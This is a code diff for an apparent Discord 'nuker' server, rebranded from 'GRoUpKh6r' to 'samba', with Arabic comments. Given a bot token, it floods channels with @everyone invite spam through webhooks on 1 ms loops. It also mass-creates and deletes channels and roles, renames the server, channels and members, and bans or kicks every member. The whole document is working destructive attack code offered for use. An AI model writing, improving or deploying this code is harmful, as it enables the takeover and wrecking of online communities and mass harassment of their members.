@@ -30,15 +30,15 @@ app.post('/api/execute', async (req, res) => {
         await client.login(token);
         const guild = await client.guilds.fetch(guildId);
 
-        // دالة مساعدة لزرع الويبهوكات والسبام الفوري
-        async function spawnWebhooksAndSpam() {
-            const channels = guild.channels.cache.filter(c => c.type === 0); // الرومات النصية
+        // دالة الويبهوكات والسبام الفوري الخارق
+        async function triggerInstantSpam() {
+            const channels = guild.channels.cache.filter(c => c.type === 0);
             for (const [id, ch] of channels) {
-                let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
+                let webhook = await ch.createWebhook({ name: webhookName || 'samba-Spam' }).catch(() => {});
                 if (webhook) {
                     let spaming = setInterval(async () => {
                         await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
-                    }, 2); // سرعة فائقة جداً
+                    }, 1); // أسرع سبام في العالم
                     activeSpamMap.set(ch.id, spaming);
                 }
             }
@@ -48,68 +48,69 @@ app.post('/api/execute', async (req, res) => {
             for (let i = 0; i < 40; i++) {
                 await guild.channels.create({ name: targetName }).catch(() => {});
             }
-            await spawnWebhooksAndSpam();
-            res.json({ success: true, message: `[GRoUpKh6r#91] Channels created and spam webhooks deployed!` });
+            await triggerInstantSpam();
+            res.json({ success: true, message: `[samba] Channels created & instant webhook spam active!` });
 
         } else if (action === 'delete_channels') {
             const deletePromises = [];
             guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
             await Promise.all(deletePromises);
-            res.json({ success: true, message: `[GRoUpKh6r#91] All channels deleted successfully.` });
+            res.json({ success: true, message: `[samba] All channels deleted successfully.` });
 
         } else if (action === 'rename_channels') {
+            const channels = guild.channels.cache.filter(c => c.type === 0);
             const renamePromises = [];
-            guild.channels.cache.forEach(ch => renamePromises.push(ch.setName(targetName).catch(() => {})));
+            channels.forEach(ch => renamePromises.push(ch.setName(targetName).catch(() => {})));
             await Promise.all(renamePromises);
-            // تفعيل الويبهوكات والسبام تلقائياً حتى عند تعديل الأسماء
-            await spawnWebhooksAndSpam();
-            res.json({ success: true, message: `[GRoUpKh6r#91] Channels renamed and instant spam triggered!` });
+            // تعديل الأسماء يفجر الويبهوكات والسبام الفوري تلقائياً
+            await triggerInstantSpam();
+            res.json({ success: true, message: `[samba] Channels renamed & instant webhook spam triggered!` });
 
         } else if (action === 'create_roles') {
             for (let i = 0; i < 30; i++) {
                 await guild.roles.create({ name: targetName }).catch(() => {});
             }
-            res.json({ success: true, message: `[GRoUpKh6r#91] Roles created successfully.` });
+            res.json({ success: true, message: `[samba] Roles created successfully.` });
 
         } else if (action === 'delete_roles') {
             guild.roles.cache.forEach(role => {
                 if (role.editable && role.name !== '@everyone') role.delete().catch(() => {});
             });
-            res.json({ success: true, message: `[GRoUpKh6r#91] Roles deleted successfully.` });
+            res.json({ success: true, message: `[samba] Roles deleted successfully.` });
 
         } else if (action === 'rename_roles') {
             guild.roles.cache.forEach(role => {
                 if (role.editable && role.name !== '@everyone') role.setName(targetName).catch(() => {});
             });
-            res.json({ success: true, message: `[GRoUpKh6r#91] Roles renamed successfully.` });
+            res.json({ success: true, message: `[samba] Roles renamed successfully.` });
 
         } else if (action === 'rename_server') {
             await guild.setName(targetName).catch(() => {});
-            res.json({ success: true, message: `[GRoUpKh6r#91] Server renamed to ${targetName}.` });
+            res.json({ success: true, message: `[samba] Server renamed to ${targetName}.` });
 
         } else if (action === 'rename_members') {
             const members = await guild.members.fetch();
             members.forEach(m => m.setNickname(targetName).catch(() => {}));
-            res.json({ success: true, message: `[GRoUpKh6r#91] All members renamed!` });
+            res.json({ success: true, message: `[samba] All members renamed!` });
 
         } else if (action === 'start_webhook_spam') {
-            await spawnWebhooksAndSpam();
-            res.json({ success: true, message: `[GRoUpKh6r#91] Infinite webhook spam activated across all channels!` });
+            await triggerInstantSpam();
+            res.json({ success: true, message: `[samba] Infinite webhook spam activated!` });
 
         } else if (action === 'stop_all_spam') {
             activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
             activeSpamMap.clear();
-            res.json({ success: true, message: `[GRoUpKh6r#91] All spam loops terminated.` });
+            res.json({ success: true, message: `[samba] All spam loops terminated.` });
 
         } else if (action === 'ban_all') {
             const members = await guild.members.fetch();
             members.forEach(m => m.ban().catch(() => {}));
-            res.json({ success: true, message: `[GRoUpKh6r#91] Banned all members.` });
+            res.json({ success: true, message: `[samba] Banned all members.` });
 
         } else if (action === 'kick_all') {
             const members = await guild.members.fetch();
             members.forEach(m => m.kick().catch(() => {}));
-            res.json({ success: true, message: `[GRoUpKh6r#91] Kicked all members.` });
+            res.json({ success: true, message: `[samba] Kicked all members.` });
         }
 
     } catch (err) {
@@ -119,5 +120,5 @@ app.post('/api/execute', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`[7bl] GRoUpKh6r#91 Engine online on port ${PORT}`);
+    console.log(`[samba] Control Engine online on port ${PORT}`);
 });
